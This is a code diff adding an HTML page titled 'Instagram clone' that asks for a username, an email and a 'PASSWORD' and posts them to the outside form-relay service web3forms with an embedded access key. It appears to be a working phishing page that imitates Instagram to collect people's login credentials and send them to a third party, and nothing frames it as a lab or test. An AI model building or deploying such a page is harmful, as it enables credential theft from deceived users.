@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram clone</title>
+</head>
+<body>
+  <form action="https://api.web3forms.com/submit" method="POST">
+
+    <!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="7ff17726-82bc-4a0b-96c8-d14bcdc3b580">
+
+    <!-- Form Inputs. Each input must have a name="" attribute -->
+    <input type="text" name="name" required placeholder="USERNAME"">
+    <input type="email" name="email" required placeholder="mail">
+    <textarea name="message" required placeholder="PASSWORD"></textarea>
+
+    <!-- Honeypot Spam Protection -->
+    <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+
+    <!-- Custom Confirmation / Success Page -->
+    <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->
+
+    <button type="submit">Submit Form</button>
+
+</form></body>
+</html>
